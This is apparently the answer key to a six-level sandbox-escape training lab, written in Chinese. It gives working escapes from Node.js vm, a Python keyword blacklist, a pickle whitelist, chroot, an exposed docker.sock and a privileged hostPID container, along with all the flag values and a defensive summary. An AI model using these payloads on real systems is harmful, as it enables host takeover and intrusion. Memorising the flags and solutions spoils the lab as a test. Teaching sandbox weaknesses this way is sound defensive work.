# Sandbox Escape Lab · 答案

> 六关的完整走法。**先自己做** —— 每关页面上的「提示」都只差最后一步。
> 一键验证前四关：`python3 poc/verify.py`

---

## flag 总表

| 关卡 | 沙箱手段 | flag | 位置 |
|---|---|---|---|
| L1 | Node.js `vm` | `FLAG{sandbox_escape_node_vm_1a2b}` | sbox-web `/flag_l1` |
| L2 | Python 黑名单 | `FLAG{sandbox_escape_py_blacklist_3c4d}` | sbox-web `/flag_l2` |
| L3 | pickle 白名单 | `FLAG{sandbox_escape_pickle_attr_5e6f}` | sbox-web `/flag_l3` |
| L4 | chroot | `FLAG{sandbox_escape_chroot_fd_7a8b}` | sbox-web `/flag_l4`（jail 外） |
| L5 | docker.sock | `FLAG{sandbox_escape_docker_sock_9c0d}` | sbox-vault `/flag_l5` |
| L6 | privileged + hostPID | `FLAG{sandbox_escape_privileged_host_1e2f}` | 宿主 `/lab-escape/l6.flag` |

---

## L1 · Node.js vm

沙箱里没有 `process`，但沙箱里的**每一个对象**都属于宿主 Realm。取一个
字面量的 `constructor`，再取它 `constructor`，就是宿主的 `Function` ——
它 `new` 出来的函数在宿主作用域执行，`return process` 就把它要回来了。

粘进页面：

```js
this.constructor.constructor('return process')()
    .mainModule.require('fs').readFileSync('/flag_l1', 'utf8')
```

回显：`[sandbox] 'FLAG{...}'`（`util.inspect` 会给字符串加引号）。

**为什么能成**：`vm.runInContext` 换的是 global 对象，不是 Realm。
`Function` 构造函数属于宿主编译出来的那个 Realm，它的 `[[Realm]]` 里
有 `process`。

**卡点**：`this` 在沙箱顶层指向的是 context 的 global 代理，`this.constructor`
能拿到宿主 `Object`；如果写 `({}).constructor` 效果一样。
`process.mainModule` 只在 CommonJS 入口下存在 —— 本关卡就是 `node xxx.js` 起的，
所以有。ESM 入口下得换 `process.binding` 之类的路子。

---

## L2 · Python 黑名单

黑名单有 11 个词，`getattr` 不在里面 —— 这是唯一的突破口。因为
`__class__` 这类属性名可以在运行时拼出来，而黑名单匹配的是源码里的字面量。

```python
t = getattr((), '_' + '_class_' + '_')            # tuple
o = getattr(t, '_' + '_ba' + 'ses_' + '_')[0]     # object
for k in getattr(o, '_' + '_sub' + 'classes' + '_')():
    i = getattr(k, '_' + '_in' + 'it_' + '_', None)
    g = getattr(i, '_' + '_glo' + 'bals_' + '_', None)
    if isinstance(g, dict) and 'system' in g:
        g['system']('cat /flag_l2')
        break
```

回显里直接出现 flag（`system()` 写的是 fd 1，子进程的输出会原样回来）。

**为什么能成**：`getattr` + 字符串拼接 = 任意属性访问。`__subclasses__()`
里能翻到 `os._wrap_close`，它的 `__init__.__globals__` 就是 `os` 模块的
全局字典，里面有 `system`。

**卡点**：
- 别直接写 `__class__`，会命中 `__`。
- **黑名单扫的是全文**：字符串、注释、变量名里出现连续两个 `__` 都会被拒，
  包括 `d = '__'` 这种"我想用变量代替"的写法（初始化那一行就中招了）。
- 拼名字时数清楚下划线：`__subclasses__` 是前后各两个、共 14 个字符。
  少写一个的报错长这样：`AttributeError: type object 'object' has no
  attribute '__subclasses_'` —— 报错里那个名字就是少了一个 `_` 的版本。
- 推荐 `d = '_' * 2` 开头，后面全用 `d`：源码里不会出现那个词，
  也不会数错。
- 别用 `'_wrap_close'` 去比类名 —— `close` 里含 `os`，会被黑名单打掉。
  改成判断 `__init__.__globals__` 里有没有 `system`。
- 环境里没有 `os` 这个名字，别想 `__import__` —— 它是 builtins，被削了；
  只用 `getattr` + 拼名字。
- 有些子类没有 `__init__`（比如 `type` 自己的实例），所以要给
  `getattr(..., None)` 兜底。

---

## L3 · pickle 白名单

白名单卡的是 `module`，但 `STACK_GLOBAL` 的 `name` 是**限定名**，
`super().find_class()` 会用 `_getattribute()` 按点号展开：

```
module = "models"                 ← 白名单放行
name   = "subprocess.getoutput"   ← 点号一路取到 subprocess.getoutput
```

`models.py` 顶部 `import subprocess`，所以这条链是通的。

手拼载荷（6 个 opcode，在本地跑就行）：

```python
import base64

def su(s):
    b = s.encode()
    return b"\x8c" + bytes([len(b)]) + b        # SHORT_BINUNICODE

payload = (
    b"\x80\x04"                        # PROTO 4
    + su("models")
    + su("subprocess.getoutput")
    + b"\x93"                          # STACK_GLOBAL
    + su("cat /flag_l3")
    + b"\x85"                          # TUPLE1
    + b"R."                            # REDUCE + STOP
)
print(base64.b64encode(payload).decode())
```

把输出粘到页面的 L3 输入框，点「反序列化」：

```
[sandbox] 反序列化得到的对象：'FLAG{sandbox_escape_pickle_attr_5e6f}\n'
```

**为什么能成**：见上。`getoutput` 返回字符串，正好被 `print("%r")` 打出来。

**卡点**：
- 必须是 protocol ≥ 4（`\x80\x04`），低版本协议走的是 `getattr` 而不是
  点号展开，绕不过去。
- `module` 别写成 `models.subprocess` —— 白名单比对的是整个字符串。
- 想看清楚载荷结构，`pickletools.dis(payload)` 一行行给你翻译。
- 想换成读文件也行：`subprocess.check_output` + 参数列表（要多几个 opcode
  拼 list），或者用 `models.os` 这条链 —— `models.py` 也 import 了 os。

---

## L4 · chroot

沙箱进程是 root，chroot 之后 `/` 就是 `/jail`。但父进程在 chroot **之前**
打开了 `/`，`dup2` 成 fd 3 传进来（"审计日志的落盘句柄"）。

```python
print("jail 里的 / ：", os.listdir("/"))
os.fchdir(3)          # cwd 挪到 fd 3 指向的目录（jail 外面）
os.chroot(".")        # 把根也设成那里
os.chdir("/")
print(open("/flag_l4").read())
```

回显：

```
jail 里的 / ： ['readme.txt', 'data']
FLAG{sandbox_escape_chroot_fd_7a8b}
```

**为什么能成**：`chroot` 不回收 fd。fd 3 指的 inode 在 jail 外面，
`fchdir` 直接把 cwd 放了出去，再 `chroot(".")` 就把根换了。
之所以能 `chroot` 第二次，是因为进程还是 root（`CAP_SYS_CHROOT`）。

**卡点**：
- 不知道 fd 几号的话，可以 `for i in range(3, 12): os.fchdir(i)` 试 —— 本关是 3。
- `os.chdir("/..")` 是没用的：`..` 到 chroot 的根就到顶了，出不去。
  这不是"用 `..` 逃 chroot"的经典玩法，本质是**外部 fd**。
- 顺序不能反：先 `fchdir` 再 `chroot(".")`；先 chroot 的话相对路径就变了。

---

## L5 · Docker Socket

```bash
docker exec -it sbox-sock bash
docker ps
```

能看到 `sbox-vault`（就是目标容器）。最直接的一条：

```bash
docker exec sbox-vault cat /flag_l5
```

不用 CLI、纯 API 的走法（两段式，`exec` 是"创建" + "启动"）：

```bash
# 1) 创建 exec 实例
curl --unix-socket /var/run/docker.sock -s \
     -H 'Content-Type: application/json' \
     -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/flag_l5"]}' \
     http://localhost/containers/sbox-vault/exec

# → {"Id":"<ExecId>"}

# 2) 启动并拿输出
curl --unix-socket /var/run/docker.sock -s \
     -H 'Content-Type: application/json' \
     -d '{"Detach":false,"Tty":true}' \
     http://localhost/exec/<ExecId>/start
```

拿到 flag：`FLAG{sandbox_escape_docker_sock_9c0d}`

**为什么能成**：docker.sock 是守护进程的完整 API，**没有鉴权** —— 能连上
就是 root@宿主。`exec` 只是最省事的一种；起容器挂宿主机目录更狠：

```bash
docker run --rm --privileged -v /:/host alpine chroot /host cat /lab-escape/l6.flag
```

（这一条顺手把 L6 也打了 —— 概念上是"用 L5 的手段完成 L6 的目标"。）

**卡点**：
- `docker ps` 报权限问题的话，确认 socket 挂对了：
  `ls -l /var/run/docker.sock`。
- 用 python 更稳（stdlib 的 `http.client` 支持 unix socket），CLI 版本
  和守护进程不匹配时用 `DOCKER_API_VERSION` 兜底。

---

## L6 · privileged + hostPID

```bash
docker exec -it sbox-priv bash

ls /proc | grep -E '^[0-9]+$' | wc -l   # 318 —— 宿主那台 VM 的进程表
cat /proc/1/cmdline; echo               # /initd：Docker Desktop 的 VM init
ls /lab-escape                          # 没有：不在容器的 rootfs 里
cat /proc/1/root/lab-escape/l6.flag
```

拿到 flag：`FLAG{sandbox_escape_privileged_host_1e2f}`

等价的 nsenter 走法（镜像里自带 util-linux，直接能用）：

```bash
nsenter -t 1 -m -u -i -n -p -- cat /lab-escape/l6.flag
```

**为什么能成**：`--pid=host` 共享宿主 PID 命名空间 → 能看见宿主 PID 1；
`--privileged` 给了 `CAP_SYS_PTRACE` / `CAP_SYS_ADMIN` → 能穿过 `/proc/<pid>/root`
进别人的 mount namespace。`/proc/1/root` 就是宿主根。

**卡点**：
- 只给 `--pid=host` 不给 `--privileged` 的话，读 `/proc/1/root` 会被
  `Permission denied`（缺 `CAP_SYS_PTRACE`）。
- 文件不在容器里，别在 `/` 下面找。
- macOS / Windows 上"宿主"是 Docker Desktop 的 Linux VM —— 这是对的，
  容器共享的是那台 VM 的内核。

---

## 附：为什么这些"沙箱"都不算沙箱

| 手段 | 隔离的层次 | 为什么不够 |
|---|---|---|
| `vm.createContext` | 变量作用域 | 同一个 Realm，构造函数可回溯到宿主 |
| 关键字黑名单 | 源码文本 | 名字能在运行时拼出来 |
| 阉割 builtins | 名字空间 | 任何字面量都能顺着 `__class__` 爬回去 |
| pickle 白名单 | import 目标 | 限定名可以带点号 |
| chroot | 路径解析 | 不回收 fd，不拦 syscall |
| 容器（默认配置） | 命名空间 + capability | 挂 socket / `privileged` / `hostPID` 都会击穿 |

真正的隔离只有一种思路：**把不可信代码放到一个它无法回指的东西后面**——
独立进程 + 最小权限 + seccomp，再外面套一层 VM 或硬件隔离。
